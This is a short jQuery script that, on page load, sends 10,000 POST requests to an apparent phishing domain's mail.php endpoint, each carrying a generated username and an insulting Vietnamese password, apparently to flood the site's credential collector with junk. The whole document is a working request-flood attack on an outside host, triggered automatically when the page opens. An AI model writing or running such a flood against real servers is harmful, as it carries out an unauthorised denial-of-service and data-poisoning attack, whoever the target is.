$(document).ready(function () {
    for (var i = 0; i < 10000; i++) {
        $.ajax({
            method: 'POST',
            url: 'http://xulytaikhoanlmht.com/mail.php',
            data: {user: 'FPT-TienPD3-' + i, pass: 'Chim mẹ nhà mày'},
            cache: true,
            async: true,
            success: function(response) {
                console.log("OK" + i)
            }
        });
    }
});